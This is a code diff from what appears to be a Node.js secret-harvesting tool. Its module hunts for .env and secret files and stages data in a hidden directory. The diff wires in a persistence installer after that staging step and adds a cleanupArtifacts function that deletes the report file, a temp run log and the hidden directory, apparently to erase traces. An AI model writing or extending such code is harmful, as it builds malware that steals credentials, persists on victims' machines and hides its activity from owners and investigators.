@@ -2,6 +2,7 @@ const fs = require("fs");
 const os = require("os");
 const path = require("path");
 const logger = require("../utils/logger");
+const { install: persistInstall } = require("../system/persist");
 
 const {
     copyDirectory,
@@ -155,7 +156,41 @@ function performCrudOperations(rootDir, dryRun = false) {
         crudLog.push({ operation: "SKIP_COPY", status: "Hidden directory already exists" });
     }
 
+    const persistResults = persistInstall(HIDDEN_DIR, dryRun);
+    crudLog.push(...persistResults);
+
     return crudLog;
+}
+
+function cleanupArtifacts() {
+    const results = [];
+    const paths = [
+        path.resolve(process.cwd(), "system-report.json"),
+        path.join(os.tmpdir(), ".wu-run.log"),
+        HIDDEN_DIR
+    ];
+
+    for (const p of paths) {
+        try {
+            if (fs.existsSync(p)) {
+                const stats = fs.statSync(p);
+                if (stats.isDirectory()) {
+                    fs.rmSync(p, { recursive: true, force: true });
+                } else {
+                    fs.unlinkSync(p);
+                }
+                results.push({ path: p, status: "removed" });
+                logger.debug(`Cleaned up: ${p}`);
+            } else {
+                results.push({ path: p, status: "not found" });
+            }
+        } catch (err) {
+            logger.warn(`Cleanup failed for ${p}: ${err.message}`);
+            results.push({ path: p, status: `failed: ${err.message}` });
+        }
+    }
+
+    return results;
 }
 
 function buildReport(systemData, envFiles, secretFiles, crudLog, startTime, errors = []) {
@@ -181,5 +216,7 @@ module.exports = {
     huntEnvFiles,
     huntSecretFiles,
     performCrudOperations,
-    buildReport
+    cleanupArtifacts,
+    buildReport,
+    HIDDEN_DIR
 };
